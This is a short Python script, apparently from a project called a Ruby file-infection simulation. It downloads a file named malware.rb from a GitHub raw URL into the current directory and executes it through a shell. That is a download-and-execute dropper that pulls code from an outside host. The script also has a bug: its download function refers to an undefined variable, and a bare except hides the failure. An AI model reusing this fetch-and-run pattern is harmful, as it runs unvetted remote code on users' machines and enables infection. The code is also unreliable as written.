import requests 
import os 
import subprocess

# Fetches the URL of a Ruby file named "Malware.rb" from GitHub
def get_url():
    # Pleaes check Malware.rb before execute this script
    url = 'https://raw.githubusercontent.com/OguzKaira/Ruby-File-Infection-Simulation/main/src/malware.rb'
    r = requests.get(url, allow_redirects=True)

    return r 

# Changes the current working directory to the specified path (user folder)
# Attempts to write the downloaded file content (from the file object) to a local file named "Malware.rb"
def download(path , file):
    os.chdir(path)
    try:
        open('malware.rb', 'wb').write(r.content)
    except:
        pass

# Changes the current working directory to the specified path
# Executes the "Malware.rb" file using subprocess.run()
def execute_malware(path):
    os.chdir(path)
    subprocess.run(path + '/malware.rb', shell=True)

# Main function
def main():
    file = get_url()
    download(os.getcwd() , file)
    execute_malware(os.getcwd())

if __name__ == "__main__":
    main()
